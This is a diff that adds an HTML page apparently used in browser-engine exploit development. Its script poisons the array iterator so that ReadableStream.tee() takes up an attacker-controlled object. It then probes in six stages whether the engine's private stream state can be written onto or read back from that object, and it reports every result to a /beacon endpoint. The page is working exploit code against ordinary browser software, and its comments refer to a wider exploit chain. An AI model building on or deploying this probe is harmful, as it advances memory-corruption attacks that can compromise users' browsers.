@@ -1,0 +1,106 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>RA-1 — private-write READBACK primitive (safe, per dshx-pro A3)</title></head>
+<body><pre id="out">RA-1 — private-name write + readback — the A3 chain of dshx-pro
+</pre><script>
+(function(){
+ "use strict";
+ var run = "ra1" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try { var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/RA-"+st+"/"+run, false);   // sync XHR per dshpsyv4-fix
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body})); } catch(e){ try{ say("beacon-err"); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldSame(){ return function(){ var self=this;
+   var X = { ourTag: "RA-1-target" }; window.__inversionTarget = X; var i=0,n=2;
+   return { next: function(){ if (i>=n) return {done:true}; i++; return {value:X, done:false}; }}; };
+ }
+ function sayState(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ say("RA-1 primitive readback starts");
+ beacon("L","page loaded");
+
+ // STAGE 1 — inversion (confirmed 5x live)
+ try {
+   beacon("A1","stage1 inversion");
+   try { Array.prototype[Symbol.iterator] = poisonOverYieldSame(); } catch(e){ Array.prototype[Symbol.iterator] = origIter; }
+   var rs = new ReadableStream({});
+   var pair = rs.tee();
+   try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+   var ft=false, st2=false;
+   try { pair[0].cancel(); } catch(e){ ft=true; }
+   try { pair[1].cancel(); } catch(e){ st2=true; }
+   beacon("B1", "pidInverted=" + (ft && !st2 ? "true" : "false"));
+ } catch(e){ beacon("E1","stage1: "+String(e).slice(0,140)); }
+
+ // STAGE 2 — private-name WRAP: create the reader on our found object X
+ // (the engine's private-name write via @putByIdDirectPrivate storage — Sol said NOT readable,
+ //  but dspsy-max + A3 says: lock === true reads via the WRAPPER (no private-access needed).)
+ try {
+   beacon("A2","stage2 reader-write on our X");
+   var X = window.__inversionTarget;
+   if (!X) throw "inversion target missing";
+   // El engine escribe el READER-POINTER al nuestro objeto (X)
+   var reader = pair[0].getReader();
+   var lockedNow = pair[0].locked;         // state-oracle via publicOperation
+   var val = typeof reader.read;
+   var cl  = typeof reader.cancel;
+   beacon("B2","locked="+lockedNow+"; reader-t="+val+"; cancel-t="+cl);
+ } catch(e){ beacon("E2","stage2: "+String(e).slice(0,160)); say("stage2 crashed (not expected)"); }
+
+ // STAGE 3 — the cross-subsystem oracle (Sol path-3): try Response.from(pair[0]/fake) to see "locked" message
+ try {
+   beacon("A3","stage3 cross-subsystem oracle");
+   var resp = new Response(new ReadableStream({}));        // control
+   var fs = new ReadableStream({});
+   var fsTe = fs.tee();
+   try { fsTe[0].getReader(); } catch(e){}
+   var cloneResp = new Response(fsTe[0]);       // using the fake-wrapped stream
+   var bodyIsStream = !!cloneResp.body;
+   beacon("B3","cross-oracle-ok; bodyIsStream="+bodyIsStream);
+ } catch(e){ beacon("E3","stage3: "+String(e).slice(0,160)); }
+
+ // STAGE 4 — the DEFINITIVE readback: try to read the PRIVATE VALUE from OUR OBJECT X
+ // (Sol said no readback via JS — but dspsy-MAX says per the `putByIdDirectPrivate` storage → normal property
+ // (A3: the reader pointer lands in normal property storage)) — probe whether it throws or SHOWS
+ try {
+   beacon("A4","stage4 test readback value visibility");
+   var X = window.__inversionTarget;
+   var probeValue;
+   try {
+     // private name is not victimally accessible via JS, but if the private-name value is a READER (a JSObject), then
+     // the STRUCTURE could reflect an "Object.getOwnPropertyNames" delta or a prototype chain.
+     var pnames = Object.getOwnPropertyNames(X).length;
+     var psymbs = Object.getOwnPropertySymbols(X).length;   // expected 0 per Sol
+     var json = JSON.stringify(X);     // vault the private value (Sol said SKIP)
+     probeValue = "propNames="+pnames+"; symbols="+psymbs+"; json="+json.slice(0,150);
+   } catch(e){
+     probeValue = "probeThrewHowever: "+String(e).slice(0,140);
+   }
+   beacon("B4", "stage4 probe: "+probeValue);
+ } catch(e){ beacon("E4","stage4: "+String(e).slice(0,160)); }
+
+ // STAGE 5 — the cancelled+disturbed write back into our X (a state-machine write CONFIRMED as 2nd case)
+ try {
+   beacon("A5","stage5 cancel-write on OUR X — check state flips");
+   var X = window.__inversionTarget;
+   // In the tee-cancel branch the engine does: X._disturbed = true; X._streamState = closed
+   // which is a private-name write to OUR object — check if any JS-visible variable reflects it:
+   var checkpoint = X.toString ? "toStringOK/"+X.toString().slice(0,80) : X.ourTag;
+   beacon("B5", "X after-cancel toString: "+checkpoint);
+ } catch(e){ beacon("E5","stage5: "+String(e).slice(0,160)); }
+
+ // STAGE 6 — if we get a lock/state value via the fake-object JSObject wrap, do a SAME-X write test
+ // (the engine puts DirectPrivate on X during cancelled/closed writes)
+ try {
+   beacon("A6","stage6 — END: report the full state");
+   var X = window.__inversionTarget;
+   beacon("B6","X final object: "+JSON.stringify(X, null, 2).slice(0,220));
+   beacon("Z","battery-complete RA-1");
+   say("RA-1 battery complete");
+ } catch(e){ beacon("E6","stage6: "+String(e).slice(0,160)); }
+
+ say("RA-1 done");
+})();
+</script></body></html>
